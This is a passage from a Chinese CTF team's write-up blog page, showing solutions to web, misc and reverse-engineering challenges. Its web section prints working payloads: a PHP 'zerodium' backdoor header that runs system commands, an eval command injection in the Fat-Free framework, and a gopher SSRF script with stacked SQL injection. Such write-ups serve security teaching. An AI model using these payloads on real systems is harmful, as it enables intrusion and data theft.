<!DOCTYPE html>
<html lang="zh-cn">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='è™ç¬¦CTFæ‰“äº†ä¸ªNo.8ï¼Œè¿™æ³¢æ˜¯é˜Ÿå‹å¸¦é£'><title>è™ç¬¦CTF Writeup by X1cT34m</title>

<link rel='canonical' href='https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='è™ç¬¦CTF Writeup by X1cT34m'>
<meta property='og:description' content='è™ç¬¦CTFæ‰“äº†ä¸ªNo.8ï¼Œè¿™æ³¢æ˜¯é˜Ÿå‹å¸¦é£'>
<meta property='og:url' content='https://anthem-whisper.github.io/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/'>
<meta property='og:site_name' content='wh1sper'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ä»£ç å®¡è®¡' /><meta property='article:tag' content='MD5å“ˆå¸Œæ³¨å…¥' /><meta property='article:tag' content='SSRF' /><meta property='article:published_time' content='2021-04-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-04-04T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094446.png' />
<meta name="twitter:title" content="è™ç¬¦CTF Writeup by X1cT34m">
<meta name="twitter:description" content="è™ç¬¦CTFæ‰“äº†ä¸ªNo.8ï¼Œè¿™æ³¢æ˜¯é˜Ÿå‹å¸¦é£"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094446.png' />
    <link rel="shortcut icon" href="img/favicon.png" />

    </head>
    <body class="">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.body.dataset.scheme = 'dark';
        } else {
            document.body.dataset.scheme = 'light';
        }
    })();
</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
        
        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
        <h2 class="site-description">ä¸“æ³¨Webå®‰å…¨ä¸ä»£ç å®¡è®¡</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/links'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        
            <li id="dark-mode-toggle">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                <span>æš—è‰²æ¨¡å¼</span>
            </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <div id="article-toolbar">
        <a href="https://anthem-whisper.github.io/" class="back-home">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



            <span>Back</span>
        </a>
    </div>

    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/">
                
                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210404094446.png" loading="lazy" alt="Featured image of post è™ç¬¦CTF Writeup by X1cT34m" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >
                ä»£ç å®¡è®¡
            </a>
        
            <a href="/tags/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/" >
                MD5å“ˆå¸Œæ³¨å…¥
            </a>
        
            <a href="/tags/ssrf/" >
                SSRF
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/p/%E8%99%8E%E7%AC%A6ctf-writeup-by-x1ct34m/">è™ç¬¦CTF Writeup by X1cT34m</a>
    </h2>

    
    <h3 class="article-subtitle">
        è™ç¬¦CTFæ‰“äº†ä¸ªNo.8ï¼Œè¿™æ³¢æ˜¯é˜Ÿå‹å¸¦é£
    </h3>
    <footer class="article-time">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <time class="article-time--published">Apr 04, 2021</time>
    </footer></div>
</header>

    <section class="article-content">
    <h2 id="misc">MISC</h2>
<h3 id="ä½ ä¼šæ—¥å¿—åˆ†æå—">ä½ ä¼šæ—¥å¿—åˆ†æå—</h3>
<p>æ—¶é—´æ³¨å…¥ï¼Œæ‰‹æ’¸æ—¥å¿—å¾—åˆ°asciiç ï¼Œè½¬æ¢åˆ°<code>ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==</code>ï¼Œbase64è§£å¯†</p>
<h2 id="web">Web</h2>
<h3 id="ç­¾åˆ°">ç­¾åˆ°</h3>
<p>ç­¾åˆ°è®¿é—®ä»»æ„PHPæ–‡ä»¶ï¼ŒUser-Agentt: zerodiumphpinfo();</p>
<p>User-Agentt: zerodiumsystem(&lsquo;cat /flag&rsquo;);</p>
<h3 id="unsetme">unsetme</h3>
<p>çœ‹åˆ°æ˜¯fatfreeæ¡†æ¶ï¼Œgithubä¸‹è½½æœ€æ–°<code>fatfree-3.7.3</code>æºç ï¼Œæœ¬åœ°index.phpæ”¹æˆé¢˜ç›®ç»™çš„</p>
<p>ä¼ å‚åçœ‹åˆ°debugçš„è°ƒç”¨æ ˆï¼Œæœ¬åœ°åŠ¨æ€è°ƒè¯•ä¸€ä¸‹</p>
<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210403140105240.png" alt="image-20210403140105240"  /></p>
<p>ç›´æ¥åœ¨unsetä¸‹æ–­ç‚¹</p>
<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210403140026001.png" alt="image-20210403140026001"  /></p>
<p>è·Ÿè¿›åˆ°<code>base.php</code>ï¼Œçœ‹åˆ°530è¡Œå·¦å³æœ‰<code>eval</code>ï¼Œå› ä¸ºæ˜¯æ‹¼æ¥æ‰§è¡Œæ‰€ä»¥çŒœæµ‹å­˜åœ¨å‘½ä»¤æ³¨å…¥</p>
<p><img src="https://gitee.com/leonsec/images/raw/master/image-20210403135453125.png" alt="image-20210403135453125"  /></p>
<p>è™½ç„¶å¯¹å¼•å·ç­‰æœ‰è½¬ä¹‰ï¼Œä½†æ˜¯ç»•ä¸€ä¸‹å°±okï¼Œè°ƒè¯•çš„æ—¶å€™å‘ç°ä¸»è¦æ˜¯å®ƒå¯¹<code>[]</code>è¿‡æ»¤çš„æœ‰ç‚¹é—®é¢˜</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nx">n</span><span class="p">[]);</span><span class="nx">system</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span><span class="k">echo</span><span class="p">(</span><span class="mi">1</span>
<span class="nx">POST</span><span class="o">:</span>
<span class="mi">0</span><span class="o">=</span><span class="nx">cat</span> <span class="o">/</span><span class="nx">flag</span>
</code></pre></div><p><img src="https://gitee.com/leonsec/images/raw/master/image-20210403135248632.png" alt="image-20210403135248632"  /></p>
<p>flag{d77d7d9b-941a-4087-949f-c72a466f9c5b}</p>
<h3 id="æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ">â€œæ…¢æ…¢åšâ€ç®¡ç†ç³»ç»Ÿ</h3>
<p>ç¬¬ä¸€æ­¥MD5å“ˆå¸Œæ³¨å…¥ï¼Œå¯†ç <code>kydba</code></p>
<p>ç¬¬äºŒæ­¥Gopheræ‰“admin.phpï¼Œå­˜åœ¨å †å æ³¨å…¥ï¼Œç”¨å¼ºç½‘æ¯éšä¾¿æ³¨çš„renameæ”¹è¡¨åèƒ½å¾—åˆ°admin_innerçš„è´¦æˆ·å¯†ç </p>
<p>ä½†æ˜¯ç™»é™†åéœ€è¦çŒœè§£ï¼Œæ˜¯<code>admin</code></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># python3</span>
<span class="c1"># wh1sper</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>

<span class="c1">#username = &#34;1&#39;;rename table real_admin_here_do_you_find to thetmp;rename table fake_admin to real_admin_here_do_you_find;rename table thetmp to fake_admin;&#34;</span>
<span class="c1">#username = &#34;1&#34;</span>
<span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span><span class="c1">#admin_inner/5fb4e07de914cfc82afb44vbaf402203d</span>
<span class="c1">#æˆ‘è‰æ³¥é©¬çš„è„‘ç˜«é¢˜</span>
<span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;5fb4e07de914cfc82afb44vbaf402203&#34;</span><span class="c1">#fake_admin/fake_passwor</span>
<span class="n">post_data</span> <span class="o">=</span> <span class="s2">&#34;username={}&amp;password={}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">quote</span><span class="p">(</span><span class="n">username</span><span class="p">),</span> <span class="n">quote</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
<span class="n">cl</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">post_data</span><span class="p">)</span>

<span class="n">stream</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;POST /flag.php HTTP/1.1
</span><span class="s2">Host: 127.0.0.1
</span><span class="s2">Content-Type: application/x-www-form-urlencoded
</span><span class="s2">Content-Length: {}
</span><span class="s2">Cookie: PHPSESSID=fuj95a6eo7sa84923b6eg5bie2; path=/
</span><span class="s2">
</span><span class="s2">{}
</span><span class="s2">&#34;&#34;&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cl</span><span class="p">,</span> <span class="n">post_data</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># POSTå‚æ•°å…ˆç¼–ç ä¸€æ¬¡</span>

<span class="n">host</span> <span class="o">=</span> <span class="s2">&#34;gopher://127.0.0.1:80/&#34;</span>
<span class="k">print</span><span class="p">(</span><span class="n">host</span><span class="o">+</span><span class="s1">&#39;_&#39;</span><span class="o">+</span><span class="n">quote</span><span class="p">(</span><span class="n">stream</span><span class="p">))</span> <span class="c1"># Gopheræ•°æ®æµå†ç¼–ç ä¸€æ¬¡</span>
<span class="c1">#print(stream)</span>
</code></pre></div><p>æ„é€ Gopheræ•°æ®ï¼Œå…ˆæ‰“admin.phpï¼Œå¾—åˆ°Cookieä¹‹åå¸¦ç€Cookieæ‰“flag.phpå°±èƒ½æ‹¿åˆ°flagã€‚</p>
<h2 id="reverse">Reverse</h2>
<h3 id="goencrypt">GoEncrypt</h3>
<p>è¾“å…¥ç¬¦åˆæ­£åˆ™æ ¼å¼çš„flag:flag{11111111-1111-1111-1111-111111111111}, é™¤äº†â€-â€œçš„å…¶ä»–hexç¼–ç  ï¼Œä¹‹ååˆ†æˆ2ç»„ xtea,è„šæœ¬</p>
<p>æŠ„ç™¾åº¦å°±è¡Œ</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#define uint32_t unsigned int
</span><span class="cp"></span><span class="kt">void</span> <span class="nf">encipher</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">num_rounds</span><span class="p">,</span> <span class="n">uint32_t</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">uint32_t</span> <span class="k">const</span> <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">uint32_t</span> <span class="n">v0</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">delta</span> <span class="o">=</span> <span class="mh">0x12345678</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_rounds</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">v0</span> <span class="o">+=</span> <span class="p">(((</span><span class="n">v1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">sum</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">sum</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
        <span class="n">sum</span> <span class="o">+=</span> <span class="n">delta</span><span class="p">;</span>
        <span class="n">v1</span> <span class="o">+=</span> <span class="p">(((</span><span class="n">v0</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v0</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">v0</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">sum</span> <span class="o">+</span> <span class="n">key</span><span class="p">[(</span><span class="n">sum</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">decipher</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">num_rounds</span><span class="p">,</span> <span class="n">uint32_t</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">uint32_t</span> <span class="k">const</span> <span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">uint32_t</span> <span class="n">v0</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">v1</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">delta</span> <span class="o">=</span> <span class="mh">0x12345678</span><span class="p">,</span> <span class="n">sum</span> <span class="o">=</span> <span class="n">delta</span> <span class="o">*</span> <span class="n">num_rounds</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">num_rounds</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">v1</span> <span class="o">-=</span> <span class="p">(((</span><span class="n">v0</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v0</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">v0</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">sum</span> <span class="o">+</span> <span class="n">key</span><span class="p">[(</span><span class="n">sum</span> <span class="o">&gt;&gt;</span> <span class="mi">11</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
        <span class="n">sum</span> <span class="o">-=</span> <span class="n">delta</span><span class="p">;</span>
        <span class="n">v0</span> <span class="o">-=</span> <span class="p">(((</span><span class="n">v1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">v1</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">sum</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">sum</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">uint32_t</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xedf5d910</span><span class="p">,</span><span class="mh">0x542702cb</span><span class="p">};</span><span class="c1">//è¿˜æœ‰ä¸€ç»„å¯¹ç…§çš„ æ”¹ä¸€ä¸‹å°±è¡Œ
</span><span class="c1"></span>    <span class="n">uint32_t</span> <span class="k">const</span> <span class="n">k</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x10203</span><span class="p">,</span><span class="mh">0x4050607</span><span class="p">,</span><span class="mh">0x8090a0b</span><span class="p">,</span><span class="mh">0xc0d0e0f</span> <span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span><span class="c1">//num_roundså»ºè®®å–å€¼ä¸º32
</span><span class="c1"></span>    <span class="c1">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°
</span><span class="c1"></span>    <span class="c1">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½
</span><span class="c1"></span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;åŠ å¯†å‰åŸå§‹æ•°æ®ï¼š0x%x 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;åŠ å¯†åçš„æ•°æ®ï¼š0x%x 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">decipher</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">k</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;è§£å¯†åçš„æ•°æ®ï¼š0x%x 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><h3 id="crackme">Crackme</h3>
<p>è¾“å…¥17ä¸ªå­—ç¬¦åˆ†æˆ7å’Œ10ï¼Œåˆè¾“å…¥ä¸€ä¸ªæ•°è¦æ»¡è¶³</p>
<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210403190710.PNG" alt="æ•è·"  /></p>
<p>çˆ†ç ´å°±è¡Œ</p>
<div class="highlight"><pre class="chroma"><code class="language-c++" data-lang="c++"><span class="c1">//ä¸€ä¸ªé™¤ ä¸€ä¸ª%
</span><span class="c1"></span><span class="cp">#include</span><span class="cpf">&lt;math.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
<span class="kt">double</span> <span class="nf">nmsl</span><span class="p">(</span><span class="kt">double</span> <span class="n">a</span><span class="p">,</span> <span class="kt">double</span> <span class="n">b</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">double</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">pow</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="o">-</span><span class="mf">1.0</span><span class="p">);</span>
	<span class="kt">double</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">tmp</span> <span class="o">/</span> <span class="n">exp</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">double</span> <span class="n">v20</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
	<span class="kt">double</span> <span class="n">v15</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">12379</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">v20</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
		<span class="n">v15</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>
		<span class="k">do</span> <span class="p">{</span>
			<span class="n">v15</span> <span class="o">=</span> <span class="n">v15</span> <span class="o">+</span> <span class="n">nmsl</span><span class="p">(</span><span class="n">v20</span><span class="p">,</span> <span class="p">(</span><span class="kt">double</span><span class="p">)</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mf">0.001</span><span class="p">;</span>
			<span class="n">v20</span> <span class="o">=</span> <span class="n">v20</span> <span class="o">+</span> <span class="mf">0.001</span><span class="p">;</span>
		<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">v20</span> <span class="o">&lt;=</span> <span class="mf">100.0</span><span class="p">);</span>
		<span class="kt">int</span> <span class="n">total</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">v15</span> <span class="o">+</span> <span class="n">v15</span> <span class="o">+</span> <span class="mf">3.0</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="n">total</span> <span class="o">==</span> <span class="mh">0x5a2</span><span class="p">)</span><span class="c1">//total == 0x13b03 
</span><span class="c1"></span>		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;i == %d ,  x== 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">total</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
<span class="c1">//99038
</span></code></pre></div><p>å‰7ä¸ªå’Œ 99038ç”Ÿæˆçš„æ•°ç»„xor ,åé¢10ä¸ª rc4,æ€»çš„æ¥è¯´éƒ½æ˜¯xor ï¼Œæ‰¾åˆ°è¦xorçš„æ•°å°±è¡Œ</p>
<pre><code>&gt;&gt; &gt; a = &quot;9903819&quot;
&gt;&gt; &gt; x = [0x8, 0x4d, 0x59, 0x06, 0x73, 0x02, 0x40]
&gt;&gt; &gt; c = &quot;&quot;
&gt;&gt; &gt; for i in range(7) :
	...    c += chr(ord(a[i]) ^ x[i])
	...
	&gt;&gt; &gt; c
	'1ti5K3y'
	&gt;&gt; &gt; s = [0xb2, 0xd6, 0x8e, 0x3f, 0xaa, 0x14, 0x53, 0x54, 0xc6, 0x06]
	&gt;&gt; &gt; key = [0xe0, 0x95, 0xba, 0x60, 0xc9, 0x66, 0x2a, 0x24, 0xb2, 0x36]
	&gt;&gt; &gt; d = &quot;&quot;
	&gt;&gt; &gt; for i in range(10) :
	...   d += chr(s[i] ^ key[i])
	...
	&gt;&gt; &gt; c + d
	'1ti5K3yRC4_crypt0'
	&gt;&gt; &gt;
</code></pre><h2 id="pwn">Pwn</h2>
<h3 id="apollo">apollo</h3>
